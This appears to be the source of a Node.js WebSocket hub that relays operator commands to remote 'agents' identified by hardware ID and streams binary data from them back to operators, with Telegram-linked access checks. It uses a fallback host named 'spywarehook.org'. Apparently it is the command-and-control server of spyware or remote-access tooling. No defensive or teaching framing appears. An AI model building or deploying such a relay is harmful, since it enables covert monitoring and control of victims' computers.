import { createServer } from "http";
import { WebSocketServer } from "ws";
import { jwtVerify } from "jose";
import { spawn } from "child_process";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const webRoot = path.resolve(__dirname, "..");
const botEnv = path.resolve(webRoot, "..", "bot", ".env");
const webEnv = path.resolve(webRoot, ".env");

function loadEnv(file) {
  if (!fs.existsSync(file)) return;
  for (const line of fs.readFileSync(file, "utf8").split(/\r?\n/)) {
    const m = line.match(/^([A-Z0-9_]+)=(.*)$/);
    if (!m) continue;
    if (!process.env[m[1]]) process.env[m[1]] = m[2].trim();
  }
}
loadEnv(botEnv);
loadEnv(webEnv);

const PORT = Number(process.env.HUB_PORT || 3001);
const SECRET = process.env.PANEL_SECRET || "";
if (!SECRET || SECRET.length < 24) {
  console.error("[hub] PANEL_SECRET zorunlu");
  process.exit(1);
}

const key = new TextEncoder().encode(SECRET);
const DB_CLI = path.resolve(webRoot, "..", "bot", "db_cli.py");
const PY = (() => {
  const v = path.resolve(webRoot, "..", "bot", ".venv", "Scripts", "python.exe");
  return fs.existsSync(v) ? v : "python";
})();

const MAX_BIN = 6 * 1024 * 1024;
const onlineQ = new Map();

function dbAsync(cmd, args = {}) {
  return new Promise((resolve) => {
    const p = spawn(PY, [DB_CLI, cmd, JSON.stringify(args)], {
      windowsHide: true,
    });
    let out = "";
    let err = "";
    p.stdout.on("data", (d) => {
      out += d;
    });
    p.stderr.on("data", (d) => {
      err += d;
    });
    const t = setTimeout(() => {
      try {
        p.kill();
      } catch {}
      resolve(null);
    }, 12000);
    p.on("close", (code) => {
      clearTimeout(t);
      if (code !== 0) return resolve(null);
      try {
        resolve(JSON.parse((out || "").trim() || "null"));
      } catch {
        resolve(null);
      }
    });
  });
}

function markOnline(hwid, online) {
  const prev = onlineQ.get(hwid);
  if (prev) clearTimeout(prev);
  onlineQ.set(
    hwid,
    setTimeout(() => {
      onlineQ.delete(hwid);
      void dbAsync("set_agent_online", { hwid, online });
    }, online ? 200 : 800),
  );
}

async function verify(token) {
  try {
    const { payload } = await jwtVerify(token, key);
    if (
      (payload.kind === "agent" || payload.kind === "op") &&
      typeof payload.tgId === "number" &&
      typeof payload.hwid === "string" &&
      payload.hwid.length >= 8
    ) {
      return { kind: payload.kind, tgId: payload.tgId, hwid: payload.hwid };
    }
  } catch {}
  return null;
}

/** @type {Map<string, Set<import('ws').WebSocket>>} */
const agents = new Map();
/** @type {Map<string, Set<import('ws').WebSocket>>} */
const ops = new Map();

function add(map, hwid, ws) {
  let set = map.get(hwid);
  if (!set) {
    set = new Set();
    map.set(hwid, set);
  }
  set.add(ws);
}

function del(map, hwid, ws) {
  const set = map.get(hwid);
  if (!set) return;
  set.delete(ws);
  if (!set.size) map.delete(hwid);
}

function sendJson(ws, obj) {
  if (ws.readyState === 1) {
    try {
      ws.send(JSON.stringify(obj));
    } catch {}
  }
}

function relayText(set, data) {
  if (!set) return;
  for (const w of set) {
    if (w.readyState === 1) {
      try {
        w.send(data);
      } catch {}
    }
  }
}

function relayBin(set, data) {
  if (!set) return;
  for (const w of set) {
    if (w.readyState === 1) {
      try {
        w.send(data, { binary: true });
      } catch {}
    }
  }
}

function safeClose(ws, code, reason) {
  try {
    ws.close(code, reason);
  } catch {}
}

const server = createServer((req, res) => {
  if (req.url === "/health" || req.url === "/") {
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(
      JSON.stringify({
        ok: true,
        agents: agents.size,
        ops: [...ops.values()].reduce((n, s) => n + s.size, 0),
      }),
    );
    return;
  }
  res.writeHead(404);
  res.end();
});

const wss = new WebSocketServer({
  server,
  maxPayload: MAX_BIN,
  perMessageDeflate: false,
  clientTracking: true,
});

wss.on("connection", async (ws, req) => {
  let hwid = "";
  let role = "";
  try {
    const host = req.headers.host || "spywarehook.org";
    const u = new URL(req.url || "/", `https://${host}`);
    role = u.searchParams.get("role") || "";
    const token = u.searchParams.get("token") || "";
    const tok = await verify(token);
    if (!tok || (role !== "agent" && role !== "op") || tok.kind !== role) {
      safeClose(ws, 4001, "auth");
      return;
    }
    hwid = tok.hwid;
    const tgId = tok.tgId;
    ws.hwid = hwid;
    ws.tgId = tgId;
    ws.role = role;
    ws.isAlive = true;

    ws.on("error", () => {
      safeClose(ws, 1011, "err");
    });
    ws.on("pong", () => {
      ws.isAlive = true;
    });

    if (role === "agent") {
      const prev = agents.get(hwid);
      if (prev) {
        for (const old of [...prev]) {
          if (old !== ws) safeClose(old, 4000, "replaced");
        }
      }
      add(agents, hwid, ws);
      markOnline(hwid, true);
      sendJson(ws, { op: "hello", ok: true });
      relayText(ops.get(hwid), JSON.stringify({ op: "agent.online", hwid }));
    } else {
      const agent = await dbAsync("get_agent", { hwid });
      if (!agent || Number(agent.tg_id) !== tgId) {
        const admins = (process.env.ADMIN_IDS || "")
          .split(",")
          .map((s) => Number(s.trim()))
          .filter(Boolean);
        if (!admins.includes(tgId)) {
          safeClose(ws, 4003, "forbid");
          return;
        }
      }
      add(ops, hwid, ws);
      sendJson(ws, {
        op: "hello",
        ok: true,
        online: Boolean(agents.get(hwid)?.size),
      });
    }

    ws.on("message", (data, isBinary) => {
      try {
        if (role === "agent") {
          if (isBinary) {
            const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
            if (buf.length === 0 || buf.length > MAX_BIN) return;
            relayBin(ops.get(hwid), buf);
          } else {
            const text = data.toString();
            if (text.length > 2_000_000) return;
            relayText(ops.get(hwid), text);
            if (text.includes('"hb"') || text.includes('"pong"')) {
              markOnline(hwid, true);
            }
          }
        } else {
          if (isBinary) return;
          const text = data.toString();
          if (text.length > 2_000_000) return;
          const set = agents.get(hwid);
          if (!set || !set.size) {
            sendJson(ws, { op: "err", msg: "offline" });
            return;
          }
          relayText(set, text);
        }
      } catch {}
    });

    ws.on("close", () => {
      if (role === "agent") {
        del(agents, hwid, ws);
        if (!agents.get(hwid)?.size) {
          markOnline(hwid, false);
          relayText(ops.get(hwid), JSON.stringify({ op: "agent.offline", hwid }));
        }
      } else if (hwid) {
        del(ops, hwid, ws);
      }
    });
  } catch {
    safeClose(ws, 1011, "boot");
  }
});

wss.on("error", (err) => {
  console.error("[hub] wss", err.message);
});

server.on("error", (err) => {
  console.error("[hub] http", err.message);
  process.exit(1);
});

const beat = setInterval(() => {
  for (const ws of wss.clients) {
    if (ws.isAlive === false) {
      safeClose(ws, 1001, "ping");
      continue;
    }
    ws.isAlive = false;
    try {
      ws.ping();
    } catch {
      safeClose(ws, 1011, "ping");
    }
  }
}, 25000);

server.listen(PORT, process.env.HUB_BIND || "127.0.0.1", () => {
  console.log(`[hub] ws :${PORT}`);
});

function shutdown() {
  clearInterval(beat);
  try {
    wss.close();
  } catch {}
  try {
    server.close();
  } catch {}
  process.exit(0);
}
process.on("SIGINT", shutdown);
process.on("SIGTERM", shutdown);
process.on("uncaughtException", (e) => {
  console.error("[hub] uncaught", e.message);
});
process.on("unhandledRejection", (e) => {
  console.error("[hub] reject", e && e.message ? e.message : e);
});
